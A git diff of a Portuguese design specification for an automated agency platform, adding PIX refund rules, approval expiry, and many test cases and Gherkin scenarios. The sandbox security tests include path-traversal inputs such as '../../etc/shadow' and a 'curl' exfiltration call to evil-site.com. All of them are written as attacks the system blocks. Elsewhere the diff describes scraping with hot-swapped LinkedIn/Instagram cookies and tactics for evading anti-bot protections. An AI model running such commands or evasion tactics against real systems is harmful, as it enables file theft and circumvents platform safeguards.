@@ -275,6 +275,13 @@ O microsserviço `:3006` não apenas recebe pagamentos, mas atua como a **fonte 
 * **Idempotência Atômica por `txid`:** Para evitar processamento redundante ou duplicidade de avisos comemorativos em caso de retentativas do banco:
   * O gateway consulta atomicamente o registro do `txid` na tabela `pix_transactions`.
   * Se o status já for `CONCLUIDA`, o endpoint responde imediatamente `HTTP 200 {"status": "already_processed"}` e encerra o fluxo sem emitir novas mensagens AMQP.
+* **Política Rígida de Liquidação & Devolução Automática de Divergências:**
+  * O avanço do lead e confirmação de pagamento exigem **exatidão estrita ao centavo** (`valor_recebido == valor_cobrado`).
+  * Em caso de pagamento divergente (seja por valor superior, ex: cobrança de R$ 750,00 e PIX recebido de R$ 750,50, ou inferior):
+    1. O gateway **não avança** o lead no pipeline comercial.
+    2. Registra o incidente financeiro com detalhes completos em `audit_logs`.
+    3. Aciona a API de Devolução PIX do Banco Inter (`PUT /banking/v2/pix/{e2eId}/devolucao/{id}`) estornando imediatamente 100% do valor à conta pagadora com o motivo: `"Divergência de valor em relação à cobrança original"`.
+    4. Notifica o Telegram de João (`telegram.alerts`) e despacha mensagem de esclarecimento ao cliente via WhatsApp informando o estorno automático e gerando nova cobrança com valor exato.
 * **Monitoramento Preventivo de Expiração dos Certificados mTLS:**
   * O microsserviço inspeciona o campo `notAfter` do certificado `inter.crt` durante o boot do contêiner e executa um cron diário às 09:00.
   * Se a validade restante for **inferior a 30 dias**, publica automaticamente um alerta na fila `telegram.alerts`:
@@ -310,6 +317,7 @@ O serviço roda com `SCRAPER_PORT=3009`, persistindo suas tarefas de raspagem no
 | `POST` (REST) | `/api/v1/jobs` | `{"name": "...", "keywords": [...], "lang": "pt-BR", "max_time": 300, "lat": "...", "lon": "..."}` | Criação de job assíncrono de mineração no motor do scraper kit. Retorna `id` do job. |
 | `GET` (REST) | `/api/v1/jobs/{id}` | Path param `id` | Consulta o status da tarefa (`Status`: `"pending"`, `"running"`, `"ok"`, `"failed"`). |
 | `GET` (REST) | `/api/v1/jobs/{id}/download` | Path param `id` (query: `format=json\|csv`) | Download dos dados consolidados da raspagem contendo até 36 campos brutos. |
+| `POST` (REST) | `/api/v1/session/cookies` | `{"platform": "linkedin\|instagram", "cookies": {"li_at": "..."}}` | Atualização a quente de cookies de redes sociais com recarregamento em memória e persistência em volume. |
 | `GET` (MCP SSE) | `/sse` | Conexão SSE | Canal de comunicação MCP JSON-RPC 2.0 para os agentes da esteira invocarem as ferramentas. |
 
 #### Catálogo de Ferramentas MCP Expostas (`tools/list`):
@@ -441,6 +449,10 @@ Para evitar que agentes sofram bloqueios de 2FA (SMS/Authenticator), captchas in
 5. **Cadência e Rate Limiting Humanizado:**
    * Delays aleatórios entre requisições de perfis sociais (mínimo de 4 a 12 segundos).
    * Semáforo limitador de no máximo 3 coletas sociais simultâneas para não disparar proteções de tráfego anômalo.
+6. **Atualização a Quente de Cookies via Endpoint Administrativo:**
+   * Para atualizar cookies sem reiniciar containers ou interromper a esteira, o gateway disponibiliza a rota local `POST /api/v1/session/cookies` protegida por `X-Agency-Key`.
+   * Ao receber novos tokens (ex: `li_at` ou `sessionid`), atualiza imediatamente os cabeçalhos de requisição em memória e persiste de forma criptografada em `storage/cookies/`.
+   * Executa teste canário instantâneo com a nova credencial e emite notificação de sucesso para o Telegram de João.
 
 ---
 
@@ -468,6 +480,13 @@ Para evitar que agentes sofram bloqueios de 2FA (SMS/Authenticator), captchas in
 * `/pausar`: Suspende imediatamente os disparos de mensagens ativas e tarefas de mineração.
 * `/retomar`: Restabelece a operação normal da esteira.
 * `/aprovar <lead_id>`: Concede aprovação humana para avanço de etapa no modo de calibragem assistida.
+
+### 7.4 Protocolo de Aprovação Humana e Janela de Expiração (24 Horas)
+* **Fluxo de Decisão Interativa:** Para ações críticas (deploys em produção, alterações orçamentárias ou calibragem assistida de leads), o orquestrador invoca `request_owner_approval`. O `telegram-gateway` gera botões inline interativos (`[ Aprovar ]` / `[ Rejeitar ]`) e registra o chamado na tabela `telegram_approvals` com status `PENDING`.
+* **Janela Rígida de Expiração de 24 Horas:**
+  * Se João não responder em até **24 horas** a partir de `requested_at`, o registro é automaticamente transicionado para o status `EXPIRED`.
+  * **Fail-Safe Preventivo:** A ação crítica dependente é sumariamente bloqueada/abortada pela esteira.
+  * O bot edita a mensagem no chat privado para *"⏳ Solicitação Expirada (Cancelada por timeout de 24h)"* e despacha aviso formal de segurança.
 
 ---
 
@@ -933,7 +952,7 @@ O banco de dados central `pipeline.db` operado em modo WAL persiste os dados ope
 * `lead_id` (TEXT) — Identificador do lead associado (opcional, Foreign Key referenciando `leads.id`).
 * `decision_type` (TEXT NOT NULL) — Categoria da aprovação (ex: `DEPLOY_PRODUCTION`, `BUDGET_OVERRIDE`, `CALIBRATION_STEP`).
 * `details` (TEXT NOT NULL) — Contexto descritivo e dados enviados para análise de João.
-* `status` (TEXT NOT NULL DEFAULT 'PENDING') — Estado da solicitação (`PENDING`, `APPROVED`, `REJECTED`, `EXPIRED`).
+* `status` (TEXT NOT NULL DEFAULT 'PENDING') — Estado da solicitação (`PENDING`, `APPROVED`, `REJECTED`, `EXPIRED`). Transiciona automaticamente para `EXPIRED` após 24 horas sem resposta do proprietário.
 * `requested_at` (TIMESTAMP DEFAULT CURRENT_TIMESTAMP)
 * `decided_at` (TIMESTAMP) — Data e hora exata em que João clicou no botão de aprovação/rejeição ou emitiu comando.
 
@@ -1021,6 +1040,61 @@ As seguintes tabelas de infraestrutura e governança persistem no mesmo arquivo 
 | **TC-168** | Security | `security-audit-gateway (:3015)` | Detecção de injeção SQL semântica via Semgrep | Código contendo interpolação de string direta em consulta SQL | `scan_sast_semgrep` identifica vulnerabilidade OWASP A03:2021 (Injection) com severidade CRITICAL em menos de 3 segundos. | Crítica |
 | **TC-169** | Security | `security-audit-gateway (:3015)` | Detecção de dependência vulnerável (SCA com Trivy) | `package.json` contendo versão de biblioteca afetada por CVE crítica | `scan_dependencies` localiza a CVE, indica a versão de patch corrigida e sinaliza reprovação do gate de segurança. | Alta |
 | **TC-170** | Happy Path | `security-audit-gateway (:3015)` | Homologação bem-sucedida do Gate de Segurança pré-deploy | Projeto com 0 segredos, 0 CVEs críticas e Quality Gate do SonarQube `PASSED` | `get_security_gate_status` retorna `security_approved=true`, liberando o `deploy-cloud-gateway` (:3012) para produção. | Alta |
+| **TC-171** | Negative / DLX | `rabbitmq (agency.dlx)` | Roteamento para Dead-Letter Exchange após 3 tentativas de falha | Mensagem malformada ou que dispara exceção não tratada no consumidor por 3 vezes consecutivas | Mensagem é rejeitada com `basic.reject(requeue=false)` e roteada automaticamente para `agency.dlx` na fila `agency.poison_messages` com headers `x-death` e `x-first-death-reason`. | Crítica (P0) |
+| **TC-172** | Boundary / Edge | Barramento AMQP (`agency.topic`) | Rejeição de payload superior ao limite rígido de 64 KB | Publicação de evento inter-serviços com payload JSON de 65.537 bytes | Microsserviço emissor/validador Pydantic rejeita a mensagem com `PayloadTooLargeError` antes do publish; métrica de violação de payload registrada e mensagem descartada. | Alta (P1) |
+| **TC-173** | Observability | Barramento AMQP (`agency.topic`) | Propagação determinística de `correlation_id` fim-a-fim | Mensagem inbound no WhatsApp com `correlation_id="corr-1234"` | O identificador é propagado através de `whatsapp.raw` -> `guardrail-gateway` -> `whatsapp.inbound` -> `engine-core` e para qualquer alerta em `telegram.alerts`, permitindo rastreio unificado no Loki. | Alta (P1) |
+| **TC-174** | Concurrency / Queue | `whatsapp-gateway (:3005)` | Consumo cadenciado da fila `whatsapp.outbound` com intervalo inter-mensagens | 10 mensagens enfileiradas para destinatários distintos na fila `whatsapp.outbound` | Worker consome ordenadamente, respeita a pausa de 15 a 45 segundos entre conversas diferentes, e aplica humanizer em cada uma sem colisão de requisições. | Alta (P1) |
+| **TC-175** | Business Rule / Queue | `whatsapp-gateway (:3005)` | Retenção de fila `whatsapp.outbound` fora do horário comercial | Fila `whatsapp.outbound` recebe mensagens de prospecção fria às 23:00 de domingo | Worker retém o consumo da fila de prospecção ativa até 08:30 da segunda-feira seguinte, mantendo as mensagens persistidas no RabbitMQ sem perda de estado. | Alta (P1) |
+| **TC-176** | State / Lifecycle | `telegram-gateway (:3008)` | Ciclo de aprovação humana via fila `telegram.approvals` | Evento postado na fila `telegram.approvals` requerendo confirmação de João para deploy de produção | Notificação enviada com botões inline; clique em "Aprovar" grava decisão na tabela `telegram_approvals`, publica evento de aprovação no RabbitMQ e atualiza mensagem no chat. | Crítica (P0) |
+| **TC-177** | Security | Malha de Microsserviços (`X-Agency-Key`) | Bloqueio de chamadas REST e MCP SSE sem chave interna soberana | Requisição a qualquer endpoint REST ou `/sse` de qualquer um dos 11 microsserviços sem o header `X-Agency-Key` | Retorno imediato de HTTP 401 Unauthorized com payload `{"error": "missing_or_invalid_agency_key"}`; conexão SSE é sumariamente recusada. | Crítica (P0) |
+| **TC-178** | Security | `whatsapp-gateway (:3005)` | Bloqueio de endpoint sensível de logout com chave interna inválida | Requisição `POST /api/v1/session/logout` com `X-Agency-Key: token-falso` | Operação rejeitada com HTTP 401 Unauthorized; a sessão Baileys permanece conectada e a tentativa é registrada em auditoria. | Crítica (P0) |
+| **TC-179** | Security / Edge | Reverse Proxy / Ingress | Rate limiting em webhook do Banco Inter (30 req/min por IP) | 35 requisições de webhook no endpoint `/api/v1/inter/webhook` disparadas no intervalo de 1 minuto a partir do mesmo IP | As 30 primeiras requisições válidas são processadas; as 5 subsequentes são bloqueadas na borda pelo Nginx com HTTP 429 Too Many Requests. | Alta (P1) |
+| **TC-180** | Security | `payment-gateway (:3006)` | Rejeição de webhook Banco Inter vindo de IP fora da Whitelist oficial | Requisição `POST /api/v1/inter/webhook` com payload válido, mas originada de IP não pertencente aos blocos CIDR do Banco Inter | Bloqueio imediato com HTTP 403 Forbidden; alerta de suspeita de spoofing disparado para `telegram.alerts`. | Crítica (P0) |
+| **TC-181** | Security | `payment-gateway (:3006)` | Rejeição de webhook Banco Inter com header `x-webhook-key` inválido | Requisição `POST /api/v1/inter/webhook` com segredo compartilhado incorreto | Rejeição imediata com HTTP 401 Unauthorized antes de qualquer processamento ou consulta a banco de dados. | Crítica (P0) |
+| **TC-182** | Security | Reverse Proxy / Ingress | Bloqueio de acesso externo a endpoints de orquestração interna | Requisição externa da internet pública para `/api/v1/agent/run` ou `/api/v1/sandbox/run-command` | Proxy reverso bloqueia na borda com HTTP 403 Forbidden; acesso liberado estritamente para a rede interna Docker `agency-network` / localhost. | Crítica (P0) |
+| **TC-183** | State / Lifecycle | `payment-gateway (:3006)` | Monitoramento proativo de expiração de certificado mTLS (< 30 dias) | Cron diário das 09:00 executado com certificado `inter.crt` com validade de 20 dias restantes | Microsserviço inspeciona campo `notAfter` e publica alerta prioritário na fila `telegram.alerts` avisando João da necessidade de renovação no Internet Banking PJ. | Alta (P1) |
+| **TC-184** | Negative / Edge | `payment-gateway (:3006)` | Liquidação PIX com valor divergente da cobrança emitida | Webhook de liquidação contendo `valor: "50.00"` para um `txid` emitido com `amount_cents=75000` (R$ 750,00) | Gateway detecta divergência monetária, atualiza status para `LIQUIDACAO_DIVERGENTE`, bloqueia avanço dos gates e despacha alerta urgente para o Telegram de João. | Crítica (P0) |
+| **TC-185** | Security | `workspace-sandbox-service (:3010)` | Bloqueio de Path Traversal na leitura de arquivos (`read_file`) | Invocação MCP `read_file` com `path="../../etc/passwd"` ou `path="/etc/shadow"` | Serviço normaliza caminho canônico, identifica tentativa de escape do workspace e retorna erro de segurança sem expor nenhum arquivo do host. | Crítica (P0) |
+| **TC-186** | Security | `workspace-sandbox-service (:3010)` | Bloqueio de escrita fora do workspace (`write_file`) | Invocação MCP `write_file` com `path="../secrets.env"` | Validação estrita de diretório raiz rejeita a escrita fora do escopo do workspace do cliente, protegendo a máquina host. | Crítica (P0) |
+| **TC-187** | Negative | `workspace-sandbox-service (:3010)` | Falha determinística de `patch_file` quando target não é localizado | Invocação MCP `patch_file` onde `target="funcao_inexistente()"` não existe no arquivo | Retorna erro determinístico indicando ausência do bloco alvo; o arquivo original permanece 100% inalterado sem corrupção. | Alta (P1) |
+| **TC-188** | Negative | `workspace-sandbox-service (:3010)` | Falha de `patch_file` por correspondência ambígua (múltiplos blocos) | Invocação MCP `patch_file` onde `target="return true;"` aparece 3 vezes no mesmo arquivo | Operação rejeitada exigindo bloco de contexto com linhas adjacentes para garantir substituição unívoca e segura. | Alta (P1) |
+| **TC-189** | Security | `workspace-sandbox-service (:3010)` | Isolamento de rede do container efêmero (`--network none`) | Container efêmero executando script de build/teste que tenta `curl https://google.com` | Chamada de rede falha imediatamente por ausência de interface de rede (`network unreachable`); dados do workspace não podem ser exfiltrados. | Crítica (P0) |
+| **TC-190** | Resilience / Stress | `workspace-sandbox-service (:3010)` | Contenção de estouro de memória (OOM) no container de sandbox | Script no container tenta alocar 3 GB de RAM em loop (teto configurado: 2 GB) | Daemon Docker encerra o processo interno por OOM (`exit code 137`); o serviço captura o evento, limpa o contêiner e retorna erro tratado ao orquestrador. | Alta (P1) |
+| **TC-191** | Security | `git-vcs-gateway (:3011)` | Bloqueio atômico de commit ao detectar credencial via Gitleaks | Invocação MCP `git_commit` com código alterado contendo chave de API privada | Gateway executa `scan_secrets` no diff, detecta o vazamento, cancela o commit, desfaz o staging e retorna erro com arquivo e linha da chave. | Crítica (P0) |
+| **TC-192** | Business Rule | `git-vcs-gateway (:3011)` | Bloqueio de commit direto na branch `main` ou `production` | Invocação MCP `git_commit` com workspace posicionado na branch `main` | Operação rejeitada pela governança de branches da fábrica; alterações devem tramitar obrigatoriamente por branches de feature e Pull Requests. | Alta (P1) |
+| **TC-193** | Boundary / Edge | `git-vcs-gateway (:3011)` | Validação de tipos permitidos em Conventional Commits | Invocação MCP `git_commit` com prefixo inválido (`update: ajustes na tela` ou `bug: corrigido`) | Rejeição imediata com erro amigável listando os prefixos aceitos (`feat`, `fix`, `refactor`, `test`, `docs`, `chore`, `perf`). | Alta (P1) |
+| **TC-194** | Negative | `git-vcs-gateway (:3011)` | Tratamento de conflito de merge na abertura de Pull Request | Invocação MCP `github_create_pull_request` para branch em conflito com `develop` | API do GitHub sinaliza conflito (`mergeable: false`); gateway retorna status detalhado orientando o agente Dev a rebasear a branch. | Alta (P1) |
+| **TC-195** | Negative | `deploy-cloud-gateway (:3012)` | Tratamento de falha de compilação/build na Vercel | Invocação MCP `deploy_preview_demo` em projeto com erro de tipo TypeScript | Vercel API retorna status `ERROR`; gateway captura logs de compilação, atualiza `deployments` com `FAILED` e devolve os erros para o Dev Agent corrigir. | Alta (P1) |
+| **TC-196** | Negative | `deploy-cloud-gateway (:3012)` | Esgotamento de cota ou erro na API do Supabase | Invocação MCP `provision_database` quando o limite de projetos gratuitos da organização é atingido | Gateway intercepta erro 402/429 do Supabase, não corrompe o workspace e despacha alerta para o Telegram de João solicitando liberação de slots. | Alta (P1) |
+| **TC-197** | Happy Path | `deploy-cloud-gateway (:3012)` | Injeção segura de variáveis de ambiente na Vercel (`set_project_env_vars`) | Invocação MCP `set_project_env_vars` com `DATABASE_URL` e `APP_SECRET` para target `preview` | Variáveis injetadas via API oficial da Vercel com criptografia ativada, sem expor valores confidenciais nos logs de resposta. | Alta (P1) |
+| **TC-198** | Idempotency | `deploy-cloud-gateway (:3012)` | Idempotência de chamadas repetidas de deploy de produção | Duas requisições simultâneas de `deploy_production` para o mesmo workspace e commit | Gateway identifica deploy já ativo ou já concluído para a mesma revisão e retorna a URL já existente sem disparar builds duplicados. | Alta (P1) |
+| **TC-199** | Happy Path / CRAG | `knowledge-memory-gateway (:3013)` | Consulta com confiança intermediária (CRAG Ambiguous: 0.50 <= Score < 0.80) | Invocação MCP `recall` com pergunta parcialmente abordada nos playbooks locais | BGE-Reranker emite score 0.65; gateway combina fragmentos locais com busca complementar no SearXNG (:3009), mescla os dados e entrega resposta com fontes combinadas. | Alta (P1) |
+| **TC-200** | Performance / Idempotency | `knowledge-memory-gateway (:3013)` | Carga incremental de playbooks via hash MD5 no boot | Reinicialização do serviço `:3013` onde apenas 1 dos 10 arquivos em `knowledge/` sofreu alteração | O serviço compara hashes com `knowledge_hashes.json`, reindexa apenas o arquivo modificado e pula os 9 inalterados em menos de 200ms. | Média (P2) |
+| **TC-201** | Happy Path | `knowledge-memory-gateway (:3013)` | Chunking semântico estruturado de documento Markdown (`ingest_document`) | Invocação MCP `ingest_document` para arquivo técnico contendo 5 seções delimitadas por `#` e `##` | Fatiador divide o arquivo respeitando a hierarquia de tópicos sem quebrar blocos lógicos; gera 5 pontos distintos no Qdrant com metadados de seção. | Alta (P1) |
+| **TC-202** | Security | `knowledge-memory-gateway (:3013)` | Bloqueio de exclusão de memória de outro agente (`forget`) | Agente `cro` tenta executar `forget` com `memory_id` pertencente ao namespace `dev` | Microsserviço valida a identidade `X-Agent-Role` contra os metadados do ponto no Qdrant e recusa a remoção com HTTP 403 Forbidden. | Crítica (P0) |
+| **TC-203** | State / Lifecycle | Infraestrutura Qdrant (:6333) | Execução de snapshot vetorial atômico da coleção | Chamada ao endpoint `POST /collections/{collection}/snapshots` no Qdrant | Snapshot é gerado em `/storage/backups/qdrant/` preservando vetores e índices HNSW com integridade garantida. | Média (P2) |
+| **TC-204** | Happy Path | `browser-gateway (:3014)` | Captura de screenshot de página longa com rolagem lazy-loading | Invocação MCP `browser_screenshot` com `full_page=true` em landing page com imagens lazy-loaded | Playwright executa scroll automático disparando o carregamento dos componentes visuais, aguarda rede estável e gera o print completo sem falhas. | Alta (P1) |
+| **TC-205** | Negative | `browser-gateway (:3014)` | Detecção de erros de rede HTTP 404 e 500 no console inspection | Invocação MCP `browser_inspect_console` em página onde script tenta carregar rota `/api/v1/dados` quebrada | Retorna `has_errors: true` e lista a URL com status HTTP 404 em `network_failures`, reprovando o gate de qualidade. | Alta (P1) |
+| **TC-206** | Negative | `browser-gateway (:3014)` | Timeout em seletor inexistente durante automação interativa | Invocação MCP `browser_interact` com seletor `button#nao-existe` | Playwright aplica auto-wait até o teto de 15 segundos e devolve erro estruturado com `success: false` sem congelar a thread ou o contêiner. | Alta (P1) |
+| **TC-207** | Boundary / Edge | `browser-gateway (:3014)` | Emulação com diferentes densidades de pixels (DPR 1 vs DPR 3) | Captura de screenshot mobile com DPR 3 vs desktop com DPR 1 | Playwright renderiza respeitando a densidade e o viewport especificados, assegurando fidelidade tipográfica para envio no WhatsApp. | Média (P2) |
+| **TC-208** | Happy Path | `security-audit-gateway (:3015)` | Pentest dinâmico automatizado com Nuclei DAST (`run_dast_scan`) | Invocação MCP `run_dast_scan` com perfil `headers-ssl` contra URL de preview gerada na Vercel | Nuclei testa cabeçalhos de segurança (CSP, HSTS, X-Frame-Options, CORS) e emite relatório com vulnerabilidades encontradas antes do deploy. | Alta (P1) |
+| **TC-209** | Happy Path | `security-audit-gateway (:3015)` | Varredura de dependências limpas com Trivy SCA | Invocação MCP `scan_dependencies` em projeto com manifestos sem CVEs conhecidas | Trivy analisa `package-lock.json` e retorna `vulnerable_packages_count: 0`, aprovando o critério SCA no Gate de Segurança. | Alta (P1) |
+| **TC-210** | Negative | `security-audit-gateway (:3015)` | Resiliência a reinicialização ou indisponibilidade do SonarQube (:9000) | Invocação MCP `run_sonarqube_scan` enquanto o SonarQube está reiniciando | Gateway captura timeout/503 da API do SonarQube, retorna status `TEMPORARILY_UNAVAILABLE` e retém o gate sem travar o orquestrador. | Alta (P1) |
+| **TC-211** | Security | `security-audit-gateway (:3015)` | Detecção de Cross-Site Scripting (XSS) com Semgrep | Código React utilizando `dangerouslySetInnerHTML` com entrada vinda de query params sem sanitização | Semgrep identifica vulnerabilidade OWASP A03 com severidade HIGH e orienta a substituição por sanitizador DOMPurify. | Crítica (P0) |
+| **TC-212** | Happy Path | `whatsapp-gateway (:3005)` | Envio de proposta comercial em PDF via `send_whatsapp_media` | Invocação MCP `send_whatsapp_media` com URL de PDF de contrato comercial e legenda | Microsserviço faz download do buffer, monta mensagem de documento Baileys com MIME `application/pdf` e despacha para o cliente com sucesso. | Alta (P1) |
+| **TC-213** | Negative | `whatsapp-gateway (:3005)` | Rejeição de envio de mídia com formato executável proibido | Invocação MCP `send_whatsapp_media` com arquivo `.exe` ou URL retornando 404 | Validação rejeita o envio de arquivo não suportado ou inexistente com mensagem de erro clara sem travar a sessão. | Alta (P1) |
+| **TC-214** | Boundary / Edge | `whatsapp-gateway (:3005)` | Validação em lote de 50 telefones via `check_whatsapp_numbers` | Invocação MCP `check_whatsapp_numbers` com lista mista de celulares válidos, fixos e números malformados | Processa em lote via `onWhatsApp`, retornando array com status booleano para cada número em menos de 2 segundos. | Alta (P1) |
+| **TC-215** | Negative | `guardrail-gateway (:3007)` | Tratamento de áudio inaudível ou corrompido no Whisper | Áudio `.ogg` com ruído total ou arquivo corrompido submetido para transcrição | Whisper retorna texto vazio ou de baixíssima confiança; o gateway sinaliza `transcription_empty: true` e notifica o orquestrador para solicitar nova mensagem ao cliente. | Média (P2) |
+| **TC-216** | Happy Path | `telegram-gateway (:3008)` | Processamento de comando `/retomar` enviado por João | João envia `/retomar` no Telegram após resolução de incidente operacional | Microsserviço valida identidade de João, emite comando para o `engine-core` sair da pausa emergencial e confirma: "Operação retomada". | Alta (P1) |
+| **TC-217** | Happy Path | `telegram-gateway (:3008)` | Aprovação pontual de lead via comando `/aprovar <lead_id>` | João envia `/aprovar barbearia-vintage` no Telegram durante o modo de calibração | Gateway consulta lead no banco, valida que está aguardando aprovação, atualiza para aprovado e notifica o agente de vendas. | Alta (P1) |
+| **TC-218** | Resilience | `telegram-gateway (:3008)` | Tratamento de rate limit (Flood Control) da Telegram Bot API | Envio rápido de 30 alertas consecutivos no Telegram gerando erro HTTP 429 com `retry_after: 5` | Gateway captura o erro 429, entra em backoff pelo tempo especificado e reenvia as notificações da fila sem perda de mensagens. | Alta (P1) |
+| **TC-219** | Boundary / Edge | `osint-scraper-gateway (:3009)` | Governança estrita de limites da ferramenta `deep_research` | Invocação MCP `deep_research` solicitando pesquisa com `top_n=15` e páginas com payloads de 5 MB | Serviço ajusta `top_n` para o teto de 10, trunca cada página em 1 MB e impõe timeout rígido de 120 segundos, prevenindo estouro de memória. | Alta (P1) |
+| **TC-220** | State / Lifecycle | `osint-scraper-gateway (:3009)` | Teste sintético canário de cookies de redes sociais a cada 6 horas | Cron de 6 horas testa cookies do LinkedIn (`li_at`) e Instagram (`sessionid`) via requisição leve | Se o cookie estiver expirado, atualiza status para `expired` e envia alerta prioritário para a fila `telegram.alerts` antes de qualquer job de scraping falhar. | Alta (P1) |
+| **TC-221** | Resilience | `osint-scraper-gateway (:3009)` | Detecção de tela de tráfego incomum (antibot) no Google Maps | CDP detecta captcha ou tela de tráfego incomum do Google Maps durante raspagem | Motor aplica backoff exponencial inteligente, suspende temporariamente a coleta daquela coordenada geográfica e registra log sem crashar o processo. | Alta (P1) |
+| **TC-222** | Concurrency | SQLite WAL (`pipeline.db`) | Concorrência de escrita simultânea com `busy_timeout` | 5 microsserviços gravando simultaneamente na tabela `leads`, `pix_transactions`, `deployments`, etc. | SQLite gerencia as gravações concorrentes sem erro `database is locked`, respeitando o timeout de 5.000ms e preservando integridade das transações. | Crítica (P0) |
+| **TC-223** | Happy Path | Banco de Dados (`pipeline.db`) | Execução de snapshot em quente via `VACUUM INTO` às 03:00 | Script diário executa `VACUUM INTO '/storage/backups/sqlite/pipeline-TIMESTAMP.db'` durante operações ativas | Clone idêntico e compactado é gerado sem bloquear leituras ou escritas dos microsserviços. | Alta (P1) |
+| **TC-224** | Business Rule | Políticas de Armazenamento | Política de rotação e expurgo de backups com retenção de 7 dias | Rotina de manutenção verifica `/storage/backups/` com backups de 8 e 10 dias atrás | Arquivos com mais de 7 dias são deletados; backups dos últimos 7 dias permanecem intactos. | Média (P2) |
+| **TC-225** | Resilience | Stack Docker Compose & Boot Order | Bloqueio de inicialização de microsserviços se RabbitMQ estiver indisponível | Tentativa de inicializar contêineres da Camada 2 com RabbitMQ em estado `unhealthy` | Mecanismo `depends_on: { rabbitmq: { condition: service_healthy } }` impede que os gateways subam até que o barramento de mensageria esteja pronto. | Crítica (P0) |
 
 ---
 
@@ -1341,6 +1415,217 @@ Funcionalidade: Auditoria de Segurança, Varredura de Segredos e Quality Gate co
     E o Gate de Segurança deve autorizar o deploy de produção para o domínio oficial do cliente
 ```
 
+#### BDD-F1-14: Roteamento para Dead-Letter Exchange (DLX) e Tratamento de Poison Messages (TC-171 & TC-172)
+```gherkin
+Funcionalidade: Roteamento para Dead-Letter Exchange e Isolamento de Mensagens Tóxicas
+  Como arquiteto do barramento de mensageria
+  Quero que mensagens malformadas ou com falhas persistentes sejam isoladas em uma fila DLX
+  Para impedir o travamento em loop infinito dos consumidores e garantir observabilidade
+
+  Cenário: Roteamento automático para a DLX após 3 falhas consecutivas de processamento
+    Dado que uma mensagem na fila "whatsapp.raw" falha durante o processamento no "guardrail-gateway"
+    Quando o consumidor rejeita a mensagem com reentrega por 3 vezes consecutivas
+    Então o RabbitMQ deve aplicar "basic.reject(requeue=false)"
+    E deve rotear a mensagem para a exchange "agency.dlx" na fila "agency.poison_messages"
+    E a mensagem na DLX deve conter os cabeçalhos "x-death" com contagem de 3 e o motivo do descarte
+    E o consumidor deve prosseguir com a leitura das próximas mensagens sem travamento
+
+  Cenário: Rejeição preventiva de mensagem com payload superior a 64 KB
+    Dado que um microsserviço tenta publicar um evento inter-serviços com payload JSON de 70 KB
+    Quando o envelope AMQP é avaliado pelo validador Pydantic antes do envio
+    Então a publicação deve ser abortada imediatamente com erro "PayloadTooLargeError"
+    E a mensagem não deve sobrecarregar o barramento AMQP
+    E um evento de auditoria de payload excedente deve ser gravado
+```
+
+#### BDD-F1-15: Autenticação Unificada Inter-Serviços com Token Soberano X-Agency-Key (TC-177 & TC-178)
+```gherkin
+Funcionalidade: Autenticação Mandatória Inter-Serviços via Header X-Agency-Key
+  Como guardião de segurança cibernética da software house
+  Quero exigir o cabeçalho X-Agency-Key em 100% dos endpoints REST e conexões MCP SSE
+  Para blindar a malha contra requisições espúrias e comandos desautorizados no host
+
+  Cenário: Bloqueio de chamada REST ou SSE sem fornecimento do header soberano
+    Dado que uma requisição HTTP ou conexão SSE é enviada para qualquer um dos 11 microsserviços
+    Quando a requisição não inclui o cabeçalho "X-Agency-Key" ou envia um token incorreto
+    Então o microsserviço deve rejeitar a requisição imediatamente com código HTTP 401 Unauthorized
+    E o corpo da resposta deve conter "error: missing_or_invalid_agency_key"
+    E nenhuma ação operacional, consulta ou manipulação de sessão deve ser executada
+
+  Cenário: Tentativa desautorizada de logout do WhatsApp
+    Dado que um agente ou script tenta invocar "POST /api/v1/session/logout" no "whatsapp-gateway" (:3005)
+    Quando o cabeçalho "X-Agency-Key" fornecido for inválido
+    Então o endpoint deve responder com HTTP 401 Unauthorized
+    E a sessão ativa do Baileys deve permanecer estritamente conectada
+    E um alerta de tentativa de acesso desautorizado deve ser gerado
+```
+
+#### BDD-F1-16: Governança Híbrida de Segurança em Webhooks Bancários do Banco Inter (TC-179, TC-180 & TC-181)
+```gherkin
+Funcionalidade: Governança Híbrida de Segurança em Webhooks Bancários do Banco Inter
+  Como diretor de conformidade financeira
+  Quero validar autenticidade, IP de origem e taxa de requisições nos webhooks do Banco Inter
+  Para impedir ataques de spoofing, injeções de falsas liquidações e sobrecarga no gateway
+
+  Cenário: Bloqueio de webhook com IP de origem fora da whitelist oficial do BACEN/Inter
+    Dado que o endpoint "/api/v1/inter/webhook" recebe uma notificação de liquidação PIX
+    Quando o endereço IP de origem não pertencer aos blocos CIDR oficiais do Banco Inter
+    Então o "payment-gateway" deve recusar a requisição com HTTP 403 Forbidden
+    E a notificação deve ser descartada sem alterar o status da cobrança
+    E um alerta de incidente de segurança com o IP suspeito deve ser despachado para a fila "telegram.alerts"
+
+  Cenário: Rejeição de webhook com segredo x-webhook-key inválido
+    Dado que uma chamada atinge "/api/v1/inter/webhook" a partir de um IP válido
+    Quando o cabeçalho "x-webhook-key" não conferir com o segredo configurado no Internet Banking PJ
+    Então a requisição deve ser rejeitada imediatamente com HTTP 401 Unauthorized
+    E nenhuma consulta à tabela "pix_transactions" deve ser processada
+
+  Cenário: Aplicação de rate limiting de 30 requisições por minuto na borda
+    Dado que um mesmo IP dispara mais de 30 requisições em menos de 60 segundos no webhook bancário
+    Quando a trigésima primeira requisição atinge o proxy reverso Nginx
+    Então ela deve ser sumariamente bloqueada na borda com código HTTP 429 Too Many Requests
+    E o microsserviço "payment-gateway" não deve ser acionado
+```
+
+#### BDD-F1-17: Blindagem contra Path Traversal e Isolamento de Rede na Sandbox MCP (:3010) (TC-185, TC-186 & TC-189)
+```gherkin
+Funcionalidade: Blindagem contra Path Traversal e Isolamento de Rede no Workspace Sandbox (:3010)
+  Como operador de infraestrutura
+  Quero confinar todas as operações de arquivos e comandos de terminal dentro da raiz do workspace
+  Para garantir que agentes ou dependências maliciosas jamais leiam arquivos do host ou acessem a internet
+
+  Cenário: Tentativa de leitura de arquivo fora da raiz do workspace com Path Traversal
+    Dado que um agente invoca a ferramenta MCP "read_file" passando "path: ../../etc/shadow"
+    Quando o "workspace-sandbox-service" normaliza o caminho relativo contra o workspace canônico
+    Então o serviço deve detectar que o destino escapa do diretório autorizado
+    E deve rejeitar a operação com erro HTTP 400 "Path Traversal Violation"
+    E nenhum byte fora do workspace deve ser lido ou retornado
+
+  Cenário: Isolamento total de rede externa no container efêmero
+    Dado que um comando "run_terminal_command" é executado no container descartável
+    Quando o script executa "curl -s https://evil-site.com/exfiltrate"
+    Então a chamada de rede deve falhar imediatamente com erro de rede inalcançável
+    E nenhum dado do cliente ou código-fonte pode ser transmitido para a internet
+```
+
